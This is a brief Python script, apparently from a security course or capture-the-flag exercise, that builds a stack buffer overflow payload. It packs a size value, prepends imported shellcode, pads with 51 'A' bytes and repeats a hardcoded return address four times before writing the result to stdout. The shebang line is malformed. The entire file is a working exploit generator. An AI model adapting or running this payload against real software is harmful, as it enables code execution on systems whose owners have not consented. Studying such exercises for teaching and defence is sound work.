#/bash/bin/python3
import sys
import struct
from shellcode import shellcode
#0xbffef39c
#0xbffb94a4
def generate_exploit_file(filename):

    new_ret_addr = 0xbffef330
    hex = 0x4000000e
    payload = struct.pack("<I", hex)+shellcode + b'A' * 51 + struct.pack("<I", new_ret_addr)*4

    
    sys.stdout.buffer.write(payload)

if __name__ == "__main__":
    generate_exploit_file("exploit_file")
